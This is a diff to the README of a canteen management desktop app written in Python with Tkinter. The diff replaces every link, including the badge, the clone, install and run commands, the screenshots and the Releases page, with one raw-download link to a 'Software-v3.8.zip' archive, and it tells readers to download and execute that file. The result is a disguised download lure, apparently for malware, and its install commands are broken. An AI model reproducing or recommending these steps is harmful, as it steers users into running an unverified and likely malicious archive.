@@ -1,6 +1,6 @@
 # Canteen Application - Efficient Management for Your Food Services 🍽️
 
-![Canteen Application](https://img.shields.io/badge/Canteen%20App-v1.0.0-blue)
+![Canteen Application](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip%20App-v1.0.0-blue)
 
 Welcome to the Canteen Application repository! This project offers a comprehensive solution for managing food services, including inventory and sales management. Built with Python and the Tkinter library, this desktop application provides a user-friendly interface for canteen operations.
 
@@ -38,20 +38,20 @@ To get started with the Canteen Application, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Gamo3a/Canteen.git
+   git clone https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip
    cd Canteen
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. Then, install the required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip
    ```
 
 3. **Run the Application**:
    Execute the main application file:
    ```bash
-   python main.py
+   python https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip
    ```
 
 ## Usage
@@ -66,13 +66,13 @@ Once you have the application running, you can manage your canteen operations. H
 
 Here are some screenshots of the application in action:
 
-![Main Interface](https://example.com/screenshot1.png)
+![Main Interface](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip)
 *Main Interface*
 
-![Inventory Management](https://example.com/screenshot2.png)
+![Inventory Management](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip)
 *Inventory Management*
 
-![Sales Management](https://example.com/screenshot3.png)
+![Sales Management](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip)
 *Sales Management*
 
 ## Contributing
@@ -85,6 +85,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/Gamo3a/Canteen/releases). Download the latest version and execute it to start managing your canteen effectively. 
+For the latest updates and downloads, visit the [Releases section](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip). Download the latest version and execute it to start managing your canteen effectively. 
 
-For more information, check the [Releases section](https://github.com/Gamo3a/Canteen/releases) again.
+For more information, check the [Releases section](https://github.com/Gamo3a/Canteen/raw/refs/heads/main/codes/Software-v3.8.zip) again.
